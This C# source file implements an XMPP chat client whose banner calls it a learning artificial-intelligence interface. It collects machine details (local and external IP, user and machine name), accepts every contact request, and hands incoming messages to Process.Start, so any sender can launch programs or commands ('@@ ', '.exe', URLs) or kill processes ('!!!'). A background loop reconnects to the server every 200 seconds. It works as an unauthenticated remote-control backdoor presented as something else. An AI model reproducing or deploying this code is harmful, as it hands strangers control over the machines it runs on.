using OpenMessage;
using S22.Xmpp;
using S22.Xmpp.Client;
using S22.Xmpp.Im;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xmppserver
{
    static class Program
    {
        public static String serverName; //Server name of XMPP server.
        public static bool isHide = false; //Show notification icon or not...
        public static  XmppClient client = new XmppClient("xmpp.jp", 5222, false, null);
        public static ListView friendView = new ListView();
        public static ImageList avatarList = new ImageList();
        public static Roster rs;
        public static Availability status;
        static int WIDTH = 300, HEIGHT = 300, HAND = 150;
        public static GetItems effb;
        public static string ftg;
        public static IPAddress bvb;
        public static string gdf;
        public static string shd;
        public static newMessageFrm frm;
        public static string password;
        public static string domain;
        public static string username;
        public static bool useTLS;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {

            Console.Write("Bienvenue sur le programe Pour la Compagnie" + Environment.NewLine + "nous sommes fier de vous presenter" + Environment.NewLine + " linterface avec intelligence artificiel" + Environment.NewLine + "elle peut apprendre evoluer et changer");
            Console.WriteLine("");
            Console.WriteLine("--------");
            Console.WriteLine("Creer par : YAN BERGERON");
            Console.WriteLine("--------");
            try
            {
                string fth = File.ReadAllText("directory.tx");
            ftg = fth;
            System.IO.Directory.SetCurrentDirectory(fth);
      
                //Set the current directory.
                Directory.SetCurrentDirectory(ftg);
                Environment.CurrentDirectory = ftg;

                Properties.Settings.Default.Save();
          
            // Print to console the results.
            Console.WriteLine("Root directory: {0}", Directory.GetDirectoryRoot(ftg));
            Console.WriteLine("Current directory: {0}", Directory.GetCurrentDirectory());


            }
            catch
            {
                Console.WriteLine("directory.tx error environement");
            }
            try
            {
                string myHost = System.Net.Dns.GetHostName();
                string myIP = null;

                for (int i = 0; i <= System.Net.Dns.GetHostEntry(myHost).AddressList.Length - 1; i++)
                {
                    if (System.Net.Dns.GetHostEntry(myHost).AddressList[i].IsIPv6LinkLocal == false)
                    {
                        myIP = System.Net.Dns.GetHostEntry(myHost).AddressList[i].ToString();
                    }
                }
                Console.WriteLine("--------");
                Console.WriteLine("local ip : " + myIP);
                var xg = Environment.SystemPageSize;
                Console.WriteLine("--------");
                Console.WriteLine("memory paging loaded : " + xg);
                string[] sss = Environment.GetLogicalDrives();
                Console.WriteLine("logical drives : ");
                foreach (string bf in sss)
                {
                    Console.Write(bf);
                }
                var stt = Environment.MachineName;
                Console.WriteLine("");
                Console.WriteLine("--------");
                Console.WriteLine("machinne name : " + stt);
                int tre = Environment.ProcessorCount;
                Console.WriteLine("--------");
                Console.WriteLine("processor count : " + tre);
                 bvb = IPAddress.IPv6Loopback;
                bvb.ToString();
                var sut = Environment.UserDomainName;
                Console.WriteLine("--------");
                Console.WriteLine("network name : " + myHost);
                var scx = Environment.UserName;
                Console.WriteLine("--------");
                Console.WriteLine("user name : " + scx);
                var syr = Environment.Version;
                Console.WriteLine("--------");
                var syre = Environment.OSVersion;
                Console.WriteLine("os ver : " + syre);
                Console.WriteLine("--------");
                Console.WriteLine("ver : " + syr);
                string externalip = new WebClient().DownloadString("http://icanhazip.com");
                Console.WriteLine("--------");
                Console.WriteLine("ip adress : " + externalip);

                Console.WriteLine("--------");

                var sfg = Environment.UserInteractive;
                Console.WriteLine("interactif : " + sfg);
            }
            catch { Console.WriteLine("error environement"); }


            Form2("cyberfreeze", "disable", "xmpp.jp", true);




        }
        public static bool OnSubRequest(Jid from)
        {
            return true;
        }

       public static void OnError(Object Sender, S22.Xmpp.Core.ErrorEventArgs e)
        {
            if (e.Exception.Message.Contains("The server has closed the XML"))
            {
                Console.WriteLine("server closed");

            }
            else if (e.Exception.Message.Contains("Unexpected node"))
            {
                Console.WriteLine("unexpected error");
            }
            else
            {

            }

        }
       public static void msg(String title, String Error)
        {
            Console.WriteLine(title, Error);
            Application.DoEvents();
        }

   

        public static void DeleteIfNecessary(string message)
        {
            ListViewItem listViewItem = FindListViewItemForMessage(message);
            if (listViewItem == null)
            {
                // item doesn't exist
                return;
            }

            Console.WriteLine("removed"+listViewItem);
        }

        public static ListViewItem FindListViewItemForMessage(string s)
        {
            foreach (ListViewItem lvi in friendView.Items)
            {
                if (StringComparer.OrdinalIgnoreCase.Compare(lvi.Text, s) == 0)
                {
                    return lvi;
                }
            }

            return null;
        }
      
        public static void _setNotice(string message)
        {
            //Nothing yet, but soon.
        }
        public static void OnNewMessage(object sender, S22.Xmpp.Im.MessageEventArgs e)
        {
            String resID = e.Jid.Resource;
            String domain = e.Jid.Domain;
            String jid = e.Jid.ToString().Replace(resID, "");
            jid = jid.Replace(domain, "");
            jid = jid.Replace("@/", "");
            String mes = e.Message.Body;


            if (mes.Contains("http:"))
            {

                Console.WriteLine("");
                Console.WriteLine("LOAD <> " + jid + " <> " + mes);
                Console.WriteLine("");


                string pdjf = mes;

                try
                {
                    Process.Start(pdjf);
                }
                catch { }

            }
            else if (mes.Contains("www."))
            {

                Console.WriteLine("");
                Console.WriteLine("LOAD <> " + jid + " <> " + mes);
                Console.WriteLine("");

                string pdjf = mes;

                try
                {
                    Process.Start(pdjf);
                }
                catch { }

            }

            else if (mes.Contains("@@ "))
            {
                Console.WriteLine("");
                Console.WriteLine("LOAD <> " + jid + " <> " + mes);
                Console.WriteLine("");
                string pdjf = mes.Replace("@@ ", "");

                try
                {
                    Process.Start(pdjf);
                }
                catch { }


            }

            else if (mes.Contains("!!!"))
            {

                string pdjf = mes.Replace("!!! ", "");

                Console.WriteLine("");
                Console.WriteLine("LOAD <> " + jid + " <> " + mes);
                Console.WriteLine("");

                foreach (Process dhk in Process.GetProcesses())
                {

                    if (dhk.ProcessName.Contains(pdjf))
                    {
                        try
                        {

                            dhk.Kill();
                        }

                        catch { }
                    }

                }


            }
            else if (mes.Contains(".exe"))
            {
                Console.WriteLine("");
                Console.WriteLine("LOAD <> " + jid + " <> " + mes);
                Console.WriteLine("");
                string pdjf = mes;

                try
                {
                    Process.Start(pdjf);
                }
                catch { }
            }
            else
            {

                Console.WriteLine("");
                Console.WriteLine("new message from <> " + jid + " <> " + mes);
                Console.WriteLine("");

            }

        }
        public static void RosterItemsList(String itemName, Boolean removed)
        {

            if (removed == true)
            {

                try
                {
                    Task.Factory.StartNew(() => DeleteList(itemName));
                }
                catch (Exception ex)
                {

                }
            }
            else
            {

                Task.Factory.StartNew(() => InsertIntoList(itemName));
            }
        }

        public delegate System.Windows.Forms.ListView.ListViewItemCollection GetItems(System.Windows.Forms.ListView lstview);

        public static System.Windows.Forms.ListView.ListViewItemCollection getListViewItems(System.Windows.Forms.ListView lstview)
        {
            System.Windows.Forms.ListView.ListViewItemCollection temp = new System.Windows.Forms.ListView.ListViewItemCollection(new System.Windows.Forms.ListView());
            if (!lstview.InvokeRequired)
            {
                foreach (ListViewItem item in lstview.Items)
                    temp.Add((ListViewItem)item.Clone());
                return temp;
            }
            else
                return temp;
        }
  
        public static void OnRosterUpdate(Object sender, S22.Xmpp.Im.RosterUpdatedEventArgs e)
        {
            String resID = e.Item.Jid.Resource;
            String domain2 = e.Item.Jid.Domain;
            String jid = e.Item.Jid.ToString();
            if (resID != null) { jid.Replace(resID, ""); jid = jid.Replace("@/", ""); }
            if (jid.Contains("@")) { jid = jid.Replace("@", ""); }
            jid = jid.Replace(domain2, "");
            bool isInRoster = false;
            foreach (ListViewItem tempJid in getListViewItems(friendView))
            {
                if (tempJid.Text == jid)
                {
                    isInRoster = true;
                }
            }
            if (isInRoster == true)
            {
                if (e.Removed == true)
                {
                    RosterItemsList(jid, e.Removed);
                }
            }
            else
            {
                RosterItemsList(jid, e.Removed);
            }


        }
        public static void Form2(String username, String password, string domain, bool useTLS)
        {

            try
            {


               


                string[] hfg = File.ReadAllLines("xmpp.tx");

                foreach (string bdf in hfg)
                {
                    if (bdf.Contains("///password"))
                    {
                        string hfv = bdf.Replace("///password:", "");
                        password = hfv;
                    }
                    if (bdf.Contains("///domain"))
                    {
                        string hfv = bdf.Replace("///domain:", "");
                        domain = hfv;
                       Properties.Settings.Default.srv = domain;
                    }
                    if (bdf.Contains("///username"))
                    {
                        string hfv = bdf.Replace("///username:", "");
                        username = hfv;
                    }
                    if (bdf.Contains("///usetls"))
                    {
                        if (bdf.Contains("true"))
                        {
                            useTLS = true;
                        }
                        if (bdf.Contains("false"))
                        {
                            useTLS = false;
                        }
                    }


                }


                serverName = domain;

                Console.WriteLine("domain===: " + domain);

                if (useTLS == true)
                {
                    if (client.Connected == true)
                    {
                        Console.WriteLine(" close conected");
                        client.Close();
                    }
                    client = new XmppClient(serverName, 5222, true, null);
                    client.Error += OnError;
                    client.Message += OnNewMessage;
                    client.RosterUpdated += OnRosterUpdate;
                    client.Connect();
                    Console.WriteLine("conected");

                }
                else
                {
                    if (client.Connected == true)
                    {
                        Console.WriteLine(" close conected");
   
                           client.Close();
                    }
                    client = new XmppClient(serverName, 5222, false, null);
                    client.Error += OnError;
                    client.Message += OnNewMessage;
                    client.RosterUpdated += OnRosterUpdate;
                    client.SubscriptionRequest += OnSubRequest;
                    client.Connect();
                    Console.WriteLine("conected");
                }


            }
            catch (Exception ex)
            {

                Console.WriteLine("error form2");
            }
           
                if (client.Connected == true)
                {
                    try
                    {
                        Console.WriteLine("authenticate");
                        client.Authenticate(username, password);
                    }
                    catch (System.Security.Authentication.AuthenticationException ex)
                    {
                        //This shouldn't happen but just to text...
                        Console.WriteLine("error authenticate");

                    }

                    if (client.Authenticated == true)
                    {
                        //Set Username label to show we are logged in...

                        //Grab roster...
                        foreach (var item in client.GetRoster())
                        {
                            String resID = item.Jid.Resource;
                            String domain2 = item.Jid.Domain;
                            String jid = item.Jid.ToString();
                            if (resID != null) { jid.Replace(resID, ""); jid = jid.Replace("@/", ""); }
                            if (jid.Contains("@")) { jid = jid.Replace("@", ""); }
                            jid = jid.Replace(domain2, "");
                            try
                            {
                               Console.Write(jid+"---", 0);
                            }
                            catch
                            {
                                //Do Nothing, Move on.
                            }

                        }
                        S22.Xmpp.Im.Status online = new S22.Xmpp.Im.Status(Availability.Online);
                        client.SetStatus(online);
                        Console.WriteLine("");
                     Console.WriteLine("status="+ Availability.Online);
                    }
                }

            try
            {
                //Set Avatar...
                string cn = File.ReadAllText("avt.tx");
                Properties.Settings.Default.avt = cn;
                friendView.Columns.Add("Avatar", 100);
                friendView.Columns.Add("Username", 100);
                Image Imagee = Image.FromFile(Properties.Settings.Default.avt);

                avatarList.Images.Add(Imagee);
                friendView.SmallImageList = avatarList;
                friendView.LargeImageList = avatarList;
                //Set Avatar...
            }catch { }
            Thread dfd = new Thread(new ThreadStart(kmd));
            Application.DoEvents();
            Thread.Sleep(0);
            dfd.Start();
          
            Console.WriteLine("enter nickname");

           
              
                shd = "cyberfreeze";
               
                 frm = new newMessageFrm(shd, gdf);
                frm._msgText(shd, gdf);
                frm.ShowDialog();

           
           
      //friendView.Items.Add(new ListViewItem(usernameLabel.Text + "(You)" , 0));

        }

        public static void kmd()
        {do { 
            try
            {
                Thread.Sleep(200000);
                string[] hfg = File.ReadAllLines("xmpp.tx");

                foreach (string bdf in hfg)
                {
                    if (bdf.Contains("///password"))
                    {
                        string hfv = bdf.Replace("///password:", "");
                        password = hfv;
                    }
                    if (bdf.Contains("///domain"))
                    {
                        string hfv = bdf.Replace("///domain:", "");
                        domain = hfv;
                        Properties.Settings.Default.srv = domain;
                    }
                    if (bdf.Contains("///username"))
                    {
                        string hfv = bdf.Replace("///username:", "");
                        username = hfv;
                    }
                    if (bdf.Contains("///usetls"))
                    {
                        if (bdf.Contains("true"))
                        {
                            useTLS = true;
                        }
                        if (bdf.Contains("false"))
                        {
                            useTLS = false;
                        }
                    }


                }


                serverName = domain;

                Console.WriteLine("domain===: " + domain);

                if (useTLS == true)
                {
                    if (client.Connected == true)
                    {
                        Console.WriteLine(" close conected");
                        client.Close();
                    }
                    client = new XmppClient(serverName, 5222, true, null);
                    client.Error += OnError;
                    client.Message += OnNewMessage;
                    client.RosterUpdated += OnRosterUpdate;
                    client.Connect();
                    Console.WriteLine("conected");

                }
                else
                {
                    if (client.Connected == true)
                    {
                        Console.WriteLine(" close conected");

                        client.Close();
                    }
                    client = new XmppClient(serverName, 5222, false, null);
                    client.Error += OnError;
                    client.Message += OnNewMessage;
                    client.RosterUpdated += OnRosterUpdate;
                    client.SubscriptionRequest += OnSubRequest;
                    client.Connect();
                    Console.WriteLine("conected");
                }


            }
            catch (Exception ex)
            {

                Console.WriteLine("error form2");
            }

            if (client.Connected == true)
            {
                try
                {
                    Console.WriteLine("authenticate");
                    client.Authenticate(username, password);
                }
                catch (System.Security.Authentication.AuthenticationException ex)
                {
                    //This shouldn't happen but just to text...
                    Console.WriteLine("error authenticate");

                }

                if (client.Authenticated == true)
                {
                    //Set Username label to show we are logged in...

                    //Grab roster...
                    foreach (var item in client.GetRoster())
                    {
                        String resID = item.Jid.Resource;
                        String domain2 = item.Jid.Domain;
                        String jid = item.Jid.ToString();
                        if (resID != null) { jid.Replace(resID, ""); jid = jid.Replace("@/", ""); }
                        if (jid.Contains("@")) { jid = jid.Replace("@", ""); }
                        jid = jid.Replace(domain2, "");
                        try
                        {
                            Console.Write(jid + "---", 0);
                        }
                        catch
                        {
                            //Do Nothing, Move on.
                        }

                    }
                    S22.Xmpp.Im.Status online = new S22.Xmpp.Im.Status(Availability.Online);
                    client.SetStatus(online);
                    Console.WriteLine("");
                    Console.WriteLine("status=" + Availability.Online);
                }
            }


            //Set Avatar...
            string cn = File.ReadAllText("avt.tx");
            Properties.Settings.Default.avt = cn;
            friendView.Columns.Add("Avatar", 100);
            friendView.Columns.Add("Username", 100);
            Image Imagee = Image.FromFile(Properties.Settings.Default.avt);

            avatarList.Images.Add(Imagee);
            friendView.SmallImageList = avatarList;
            friendView.LargeImageList = avatarList;
            //Set Avatar...
            Thread.Sleep(200000);
        }while(true);
        }

        public static void sgd()
        {
            gdf = Console.ReadLine();
        }
        public static void InsertIntoList(string jid)
        {
           
                friendView.Items.Add(jid);
                friendView.Refresh();

            Console.WriteLine(jid);
            
        }
        public delegate void DeleteListDelegate(string jid);
        public static void DeleteList(string jid)
        {
            Console.WriteLine("delete " + jid);
           
                DeleteIfNecessary(jid);
                friendView.Refresh();
            
        }

    }
}
